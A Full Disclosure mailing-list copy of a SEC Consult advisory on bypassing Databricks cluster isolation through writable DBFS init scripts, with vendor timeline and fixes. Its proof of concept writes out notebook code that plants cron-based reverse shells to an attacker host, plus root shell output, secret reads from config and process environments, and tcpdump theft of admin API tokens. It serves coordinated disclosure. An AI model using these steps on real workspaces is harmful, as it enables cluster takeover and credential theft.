@@ -1,0 +1,520 @@
+
+Date: Tue, 2 May 2023 13:22:07 +0000
+From: "SEC Consult Vulnerability Lab,
+ Research via Fulldisclosure" <fulldisclosure@...lists.org>
+To: "fulldisclosure@...lists.org" <fulldisclosure@...lists.org>
+Subject: [FD] SEC Consult SA-20230502-0 :: Bypassing cluster isolation
+ through insecure defaults and shared storage in Databricks Platform
+
+SEC Consult Vulnerability Lab Security Advisory < 20230502-0 >
+=======================================================================
+               title: Bypassing cluster isolation through insecure defaults and
+                      shared storage
+             product: Databricks Platform
+  vulnerable version: PaaS version as of 2023-01-26
+       fixed version: Current PaaS version
+          CVE number: -
+              impact: critical
+            homepage: https://www.databricks.com
+               found: 2023-01-20
+                  by: Florian Roth (Atos)
+                      Marius Bartholdy (SEC Office Berlin)
+                      SEC Consult Vulnerability Lab
+
+                      An integrated part of SEC Consult.
+                      SEC Consult is part of Eviden, an atos business
+                      Europe | Asia | North America
+
+                      https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"Databricks Data Science & Engineering (sometimes called simply "Workspace")
+is an analytics platform based on Apache Spark. It is integrated with Azure to
+provide one-click setup, streamlined workflows, and an interactive workspace
+that enables collaboration between data engineers, data scientists, and
+machine learning engineers."
+
+Source: https://learn.microsoft.com/en-us/azure/databricks/scenarios/what-is-azure-databricks-ws
+
+
+Business recommendation:
+------------------------
+The vendor disabled legacy scripts and migrated cluster-scoped scripts from
+DBFS to WSFS. Affected customers received migration instructions.
+
+SEC Consult highly recommends to perform a thorough security review of the
+product conducted by security professionals to identify and resolve potential
+further security issues.
+
+We have also written a blog post in collaboration with Elia Florio, Sr. Director
+of Detection & Response at Databricks and Florian Roth and Marius Bartholdy,
+security researchers with SEC Consult. It can be found here:
+https://r.sec-consult.com/databr
+
+Furthermore, a proof of concept demo video has been published here (Youtube):
+https://r.sec-consult.com/dbyoutube
+
+
+Databricks concepts:
+--------------------
+Concept 1: Databricks File System (DBFS):
+
+"The Databricks File System (DBFS) is a distributed file system mounted into a
+  Databricks workspace and available on Databricks clusters. DBFS is an
+abstraction on top of scalable object storage that maps Unix-like filesystem
+calls to native cloud storage API calls."
+
+Source: https://docs.databricks.com/dbfs/index.html
+
+Therefore developers can easily handle files as if they were local to a compute
+cluster although they actually reside in a cloud storage.
+
+The recommended way to interact with the DBFS is from within a notebook by using
+the Databricks Utilities (dbutils). The following command could be used to list
+the content of a directory:
+===============================================================================
+display(dbutils.fs.ls("dbfs:/databricks/scripts"))
+===============================================================================
+
+For further information see: https://learn.microsoft.com/en-us/azure/databricks/dbfs/
+
+
+Concept 2: Init Scripts:
+
+Databricks uses a feature called "init script" to customize compute clusters.
+They can be used to install dependencies or to configure advanced network
+settings. These are shell scripts that run during the startup of each cluster.
+
+There are different types of init scripts:
+
+(I) Cluster-scoped init scripts only run on the specified cluster and have to be
+setup by the cluster owner. Before using a cluster-scoped script it has to be
+uploaded to the DBFS. In the cluster configuration it is then referenced by its
+file path, e.g dbfs:/databricks/scripts/init-health-check.sh
+
+(II) Global init scripts run on every cluster and have to be configured by an
+administrative user. Their storage location is not disclosed.
+
+(III) Legacy global init scripts are theoretically deprecated. However, they are
+enabled by default, even on newly created workspaces. The main difference to
+the newer global init scripts is that they are stored on the DBFS in a fixed
+location at dbfs:/databricks/init.
+
+For further information see: https://learn.microsoft.com/en-us/azure/databricks/clusters/init-scripts
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Bypassing cluster isolation through insecure defaults and shared storage
+
+A low-privilege user is able to break the isolation between Databricks compute
+clusters and take over any cluster in a workspace as long as they are allowed
+to run notebooks. Due to an insecure default configuration combined with
+insufficient access control, it is possible to gain remote code execution on all
+clusters of a workspace. With such an access, it is possible to leak secrets and
+to escalate privileges to those of a workspace administrator.
+
+
+Attack scenario:
+The DBFS is accessible by every user in a Databricks workspace. All files stored
+here are visible to anyone in the workspace. Cluster-scoped and legacy global
+init scripts are stored here.
+
+An authenticated attacker with the lowest possible permissions in a Databricks
+workspace could run a notebook to:
+
+1. Find and modify an existing cluster-scoped init script.
+2. Place a new script in the default location for legacy global init scripts.
+
+Both attacks lead to the take over of the compute cluster resources and enable
+further attacks. Firstly, any secrets stored can be read and, secondly,
+workspace administrator tokens can be stolen as demonstrated by Joosua
+Santasalo from Secureworks.
+
+See: https://www.databricks.com/blog/2022/10/10/admin-isolation-shared-clusters.html
+
+
+Proof of concept:
+-----------------
+1) Bypassing cluster isolation through insecure defaults and shared storage
+a) Preparations:
+
+For this POC a new Azure Databricks workspace was created with the "premium"
+pricing tier. It includes an administrative user (databricks-workspace-admin)
+as well as a newly added low-privileged user (databricks-user) with the default
+permissions "Workspace access" and "Databricks SQL access". These are the fewest
+possible permissions a user can have.
+
+To demonstrate both attack scenarios, three clusters were created:
+
+1. Cluster on which the databricks-user has permissions to run notebooks
+    ("Can attach to")
+2. Cluster for the databricks-workspace-admin with a cluster-scoped init script
+    already configured.
+3. Cluster for the databricks-workspace-admin with NO init script
+
+The databricks-user does not have access to the clusters 2 and 3.
+They cannot even see them in the portal.
+
+For the cluster 2 (with a pre-configured init script) the following notebook
+code was used by the databricks-workspace-admin to create an init script which
+simply writes example output to /tmp/init-health-check-success.txt:
+
+===============================================================================
+dbutils.fs.mkdirs("dbfs:/databricks/scripts/")
+dbutils.fs.put("/databricks/scripts/init-health-check.sh","""
+#!/bin/bash
+echo 'Init health check: successful > /tmp/init-helth-check-success.txt' """, True)
+display(dbutils.fs.ls("dbfs:/databricks/scripts/init-health-check.sh"))
+===============================================================================
+
+After that the script was applied to cluster 2 as a cluster-scoped init script.
+
+To show the impact of this attack in a more tangible way a keyvault-backed
+secret scope as well as a databricks-backed secret scope were also created.
+Their secrets were then used in the spark configuration and in the environment
+variables of cluster 2 and 3.
+
+===============================================================================
+Spark configuration:
+databricks-backed-secret {{secrets/databricks-backed-secret-scope/databricks-backed-secret}}
+azure-keyvault-backed-secret {{secrets/key-vault-backed-secret-scope/azure-keyvault-backed-secret}}
+
+Environment variables:
+databricks_backed_secret_in_environment={{secrets/databricks-backed-secret-scope/databricks-backed-secret-in-environment}}
+azure_keyvault_backed_secret_in_environment={{secrets/key-vault-backed-secret-scope/azure-keyvault-backed-secret-in-environment}}
+===============================================================================
+
+These serve only as examples. On a real productive compute cluster they could be used to
+connect to additional cloud storage as described here:
+https://learn.microsoft.com/en-us/azure/databricks/external-data/azure-storage#--access-azure-data-lake-storage-gen2-or-blob-storage-using-oauth-20-with-an-azure-service-principal
+
+
+b) Attack via pre-existing init script:
+
+The attacker starts by viewing the content of the DBFS with the following code:
+===============================================================================
+display(dbutils.fs.ls("dbfs:/databricks"))
+display(dbutils.fs.ls("dbfs:/databricks/scripts"))
+===============================================================================
+
+All found .sh files could potentially be cluster-scoped init scripts applied to
+clusters that the attacker is not aware of. It is not possible to overwrite
+existing scripts, they can however be renamed or deleted. The cluster
+configuration is only aware of the script names. Therefore, a newly created
+script with the same name will be executed. Such a malicious file was created.
+It includes a reverse shell that will continually attempt to connect to the
+attacker's server.
+
+===============================================================================
+  # rename file
+dbutils.fs.mv("/databricks/scripts/init-health-check.sh",
+"/databricks/scripts/init-health-check.sh.old")
+#write new file with malicious content
+dbutils.fs.put("/databricks/scripts/init-health-check.sh","""
+#!/bin/bash
+crontab -l > mycron
+echo "* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/$ATTACKER/8091 0>&1'" >> mycron
+crontab mycron
+rm mycron
+""", True)
+===============================================================================
+
+As soon as the init script is triggered again, for example via a cluster restart,
+a reverse shell connection, with root privileges on the compute cluster, is
+received:
+
+===============================================================================
+user@...TACKER:~$ nc -lnkvp 8091
+Listening on [0.0.0.0] (family 0, port 8091)
+Connection from $TARGET 48518 received!
+bash: cannot set terminal process group (21384): Inappropriate ioctl for device
+bash: no job control in this shell
+root@...1-110521-h6l5h1n2-10-139-64-5:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@...1-110521-h6l5h1n2-10-139-64-5:~# uname -a
+uname -a
+Linux 0121-110521-h6l5h1n2-10-139-64-5 5.4.0-1090-azure #95~18.04.1-Ubuntu SMP Sun Aug 14 20:09:27 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+root@...1-110521-h6l5h1n2-10-139-64-5:~#
+===============================================================================
+
+
+c) Attack via legacy global init script:
+
+The legacy global init script is enabled by default, therefore an attacker could
+assume it is turned on and place a script in the default location at
+dbfs:/databricks/init.
+
+===============================================================================
+dbutils.fs.mkdirs("dbfs:/databricks/init/")
+dbutils.fs.put("dbfs:/databricks/init/global-init.sh"""
+#!/bin/bash
+crontab -l > mycron
+echo "* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/$ATTACKER/8091 0>&1'" >> mycron
+crontab mycron
+rm mycron
+""", True)
+===============================================================================
+
+Global init scripts apply to every existing compute cluster. Every cluster will
+establish a reverse shell now as soon as the script is triggered again. With
+this attack it is possible to attack compute clusters even if they do not have
+a cluster-scoped init script set up.
+
+===============================================================================
+user@...TACKER:~$ nc -lnkvp 8091
+Listening on [0.0.0.0] (family 0, port 8091)
+Connection from $TARGET 53910 received!
+bash: cannot set terminal process group (988): Inappropriate ioctl for device
+bash: no job control in this shell
+root@...1-111747-cmijb28n-10-139-64-4:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@...1-111747-cmijb28n-10-139-64-4:~# uname -a
+uname -a
+Linux 0121-111747-cmijb28n-10-139-64-4 5.4.0-1100-azure #106~18.04.1-Ubuntu SMP Mon Dec 12 21:49:35 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+root@...1-111747-cmijb28n-10-139-64-4:~#
+===============================================================================
+
+
+Impact:
+
+a) Leaking sensitive information in environment variables and the configuration:
+
+Secrets configured in the keyvault-backed secret scope can only be retrieved at
+runtime by the compute instance itself via a managed identity. Even Databricks
+workspace administrators cannot read them directly. They are however available
+to the compute cluster as soon as it is initialized. With remote code execution
+and root privileges an attacker is able to read the plain text secrets of any
+cluster.
+
+Spark configuration secrets can be found at /tmp/custom-spark.conf:
+
+===============================================================================
+root@...1-111747-cmijb28n-10-139-64-4:/tmp# cat custom-spark.conf
+cat custom-spark.conf
+spark.databricks.unityCatalog.enforce.permissions false
+spark.driver.host 10.139.64.6
+spark.databricks.secret.envVar.keys.toRedact ZGF0YWJyaWNrc19iYWNrZWRfc2VjcmV0X2luX2Vudmlyb25tZW50,YXp1cmVfa2V5dmF1bHRfYmFja2VkX3NlY3JldF9pbl9lbnZpcm9ubWVudA==
+spark.driver.tempDirectory /local_disk0/tmp
+spark.databricks.delta.preview.enabled true
+spark.databricks.wsfsPublicPreview true
+databricks-backed-secret databricks-backed-secret-value <- THIS IS A SECRET
+spark.databricks.secret.sparkConf.keys.toRedact ZGF0YWJyaWNrcy1iYWNrZWQtc2VjcmV0,YXp1cmUta2V5dmF1bHQtYmFja2VkLXNlY3JldA==
+spark.databricks.mlflow.autologging.enabled true
+spark.executor.tempDirectory /local_disk0/tmp
+spark.databricks.enablePublicDbfsFuse false
+spark.databricks.workspaceUrl adb-8690126810713062.2.azuredatabricks.net
+spark.master local[*, 4]
+azure-keyvault-backed-secret azure-keyvault-backed-secret-value <- THIS IS A SECRET
+spark.databricks.cloudfetch.hasRegionSupport true
+spark.databricks.unityCatalog.enabled true
+spark.databricks.automl.serviceEnabled true
+spark.databricks.cluster.profile singleNode
+root@...1-111747-cmijb28n-10-139-64-4:/tmp#
+===============================================================================
+
+In order to read secrets in the environment variables, an attacker would need
+to access the environment of the right process. With root privileges, they are
+able to access all processes' environments by reading the corresponding
+/proc/<process-id>/environ file. For simplicity however, the right process-id
+(888) was used in this POC:
+
+===============================================================================
+root@...1-110521-h6l5h1n2-10-139-64-5:~# cat /proc/888/environ
+SHELL=/bin/bash[...]
+TERM=xterm-256color
+USER=root
+SPARK_PUBLIC_DNS=10.139.64.6
+azure_keyvault_backed_secret_in_environment=
+azure-keyvault-backed-secret-in-envionment-value <- THIS IS A SECRET
+SPARK_LOCAL_DIRS=/local_disk0SHLVL=1
+MASTER=local[4]
+SPARK_HOME=/databricks/spark
+SPARK_LOCAL_IP=10.139.64.6
+MLFLOW_CONDA_HOME=/databricks/conda
+CLASSPATH=/databricks/spark/dbconf/jets3t/:/databricks/spark/dbconf/log4j/driver:/databricks/hive/conf:/databricks/spark/dbconf/hadoop:/databricks/jars/*
+SPARK_CONF_DIR=/databricks/spark/conf
+SPARK_DIST_CLASSPATH=/databricks/spark/dbconf/log4j/driver:/databricks/jars/*
+PYENV_ROOT=/databricks/.pyenv
+DATABRICKS_LIBS_NFS_ROOT_PATH=/local_disk0/.ephemeral_nfs
+SPARK_ENV_LOADED=1
+DATABRICKS_CLUSTER_LIBS_ROOT_DIR=cluster_libraries
+PATH=/databricks/.pyenv/bin:/usr/local/nvidia/bin:/databricks/python3/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+DATABRICKS_LIBS_NFS_ROOT_DIR=.ephemeral_nfsSUDO_UID=0
+DATABRICKS_CLUSTER_LIBS_PYTHON_ROOT_DIR=python
+SPARK_SCALA_VERSION=2.12
+MAIL=/var/mail/root
+databricks_backed_secret_in_environment=
+database-backed-secret-in-environment-value <- THIS IS A SECRET
+SCALA_VERSION=2.10PTY_LIB_FOLDER=/usr/lib/libptyOLDPWD=/databricks/chauffeurSPARK_WORKE
+===============================================================================
+
+
+b) API Token leak and privilege escalation:
+
+Using a vulnerability initially found by Joosua Santasalo from Secureworks it is
+possible to leak Databricks API tokens of other users, including administrators.
+The previously proposed hardening technique "Use cluster types that support user
+isolation wherever possible." does not mitigate the initial vulnerability as
+all compute cluster types are affected by our new vulnerability.
+Source: https://www.databricks.com/blog/2022/10/10/admin-isolation-shared-clusters.html
+
+It is thereby possible to impersonate any user and to gain privileges of a
+workspace administrator.
+
+Using the previously established reverse-shell it is possible to capture
+control-plane traffic with the following command. As soon as a task is started
+with the administrative user, for example running a simple notebook, the token
+is sent unencrypted and could be leaked.
+
+(Make sure to verify that you are on the correct cluster when reproducing the
+issue using the global init script attack vector since the user cluster will
+also be attacked and send a shell too. This confused us more often than we
+would like to admit.)
+
+===============================================================================
+root@...1-110521-h6l5h1n2-10-139-64-5:~# /usr/sbin/tcpdump -i any -Aq | grep -i 'apiToken'
+/usr/sbin/tcpdump -i any -Aq | grep -i 'apiToken'
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on any, link-type LINUX_SLL (Linux cooked v1), capture size 262144 bytes
+{"apiToken":"dkea****************************a107","procStartTime":53444,"commandOrigin":"PythonDriver","commandId":"7712608268853321788_7012126414451989966_5680a35d486f42ac922d461b93b8b7bf","notebookDir":"/Users/databricks-workspace-admin@...acted.onmicrosoft.com"}
+apiToken
+{"apiToken":"dkea****************************a107","procStartTime":85732,"commandOrigin":"PythonWorker","commandId":"7712608268853321788_7012126414451989966_5680a35d486f42ac922d461b93b8b7bf","notebookDir":"/Users/databricks-workspace-
+. . .
+===============================================================================
+
+This apiToken could then be used in the Databricks CLI or with the REST API
+directly. The following example request needed administrative privileges to
+succeed:
+
+===============================================================================
+└─$ curl -s  https://adb-redacted.2.azuredatabricks.net/api/2.0/secrets/scopes/list -H 'Authorization: Bearer dkea****************************a107' | jq
+{
+   "scopes": [
+     {
+       "name": "databricks-backed-secret-scope",
+       "backend_type": "DATABRICKS"
+     },
+     {
+       "name": "key-vault-backed-secret-scope",
+       "backend_type": "AZURE_KEYVAULT",
+       "keyvault_metadata": {
+         "resource_id": "/subscriptions/714984c7-3ed0-4de2-b23b-9cffd28b74f7/resourceGroups/rg-databricks-proof-of-concept/providers/Microsoft.KeyVault/vaults/redacted-databricks-poc",
+         "dns_name": "https://redacted-databricks-poc.vault.azure.net/"
+       }
+     }
+   ]
+}
+===============================================================================
+
+Additional scenarios are possible once RCE is achieved, for example by using the
+managed identity of the compute clusters to get an access token via the instance
+metadata service at http://169.254.169.254/metadata/identity/oauth2/token.
+
+
+Vulnerable / tested versions:
+-----------------------------
+The latest Databricks PaaS offering was tested on Azure as well as Amazon Web
+Services (AWS) with the "Premium" pricing tier as of 2023-01-26.
+
+
+Vendor contact timeline:
+------------------------
+2023-01-26: Contacting vendor PGP-encrypted through security@...abricks.com
+2023-01-26: Vendor acknowledged the email and is reviewing the reports
+2023-02-15: Vendor confirms all vulnerabilities and is working on a solution
+2023-03-29: Vendor proposes a solution
+2023-05-02: Coordinated release of security advisory
+
+
+Solution:
+---------
+Databricks disabled the creation of new workspaces using the deprecated init
+script types and added support for initializing scripts in Workspace Files.
+
+The following solution for end users has been provided by the vendor:
+
+Legacy global init scripts:
+
+* Immediately disable legacy global init scripts (AWS [1] | Azure [2] ) if not actively
+   used: it's a safe, easy, and immediate step to close this potential attack vector.
+
+* Customers with legacy global init scripts deployed should first migrate legacy
+   scripts to the new global init script type (this notebook [3] can be used to automate
+   the migration work) and, after this migration step, proceed to disable the legacy
+   version as indicated in the previous step.
+
+[1] https://docs.databricks.com/clusters/init-scripts.html#migrate-legacy-scripts
+[2] https://learn.microsoft.com/en-us/azure/databricks/clusters/init-scripts#migrate-legacy-scripts
+[3] https://kb.databricks.com/legacy-global-init-script-migration-notebook
+
+
+Cluster-named init scripts:
+
+* Cluster-named init scripts are similarly affected by the issue and are also deprecated:
+   customers still using this type of init scripts should migrate them to cluster-scoped
+   scripts and make sure that the scripts are stored in the new workspace files storage
+   location (AWS [4] | Azure [5] | GCP [6]). This notebook [7] can be used to automate the migration work.
+
+
+Cluster-scoped init scripts:
+
+* Existing cluster-scoped init scripts stored on DBFS should be migrated to the alternative,
+   safer workspace files location (AWS [4] | Azure [5] | GCP [6] ). Going forward the default location of
+   cluster-scoped init scripts in the product UI will be workspace files.
+
+[4] https://docs.databricks.com/files/workspace.html
+[5] https://learn.microsoft.com/en-us/azure/databricks/files/workspace
+[6] https://docs.gcp.databricks.com/files/workspace.html
+[7] https://kb.databricks.com/cluster-named-init-script-migration-notebook
+
+
+Legacy global init scripts and cluster-named init scripts will be disabled for all workspaces
+on Sept 1, 2023. They will not function after this date.
+
+
+Advisory URL:
+-------------
+https://sec-consult.com/vulnerability-lab/
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+SEC Consult Vulnerability Lab
+
+SEC Consult is part of Eviden, an atos business
+Europe | Asia | North America
+
+About SEC Consult Vulnerability Lab
+The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, part
+of Eviden, an atos business. It ensures the continued knowledge gain of SEC
+Consult in the field of network and application security to stay ahead of the
+attacker. The SEC Consult Vulnerability Lab supports high-quality penetration
+testing and the evaluation of new offensive and defensive technologies for our
+customers. Hence our customers obtain the most current information about
+vulnerabilities and valid recommendation about the risk profile of new
+technologies.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Interested to work with the experts of SEC Consult?
+Send us your application https://sec-consult.com/career/
+
+Interested in improving your cyber security with the experts of SEC Consult?
+Contact our local offices https://sec-consult.com/contact/
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Mail: security-research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+EOF Florian Roth, Marius Bartholdy / @2023
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: https://seclists.org/fulldisclosure/
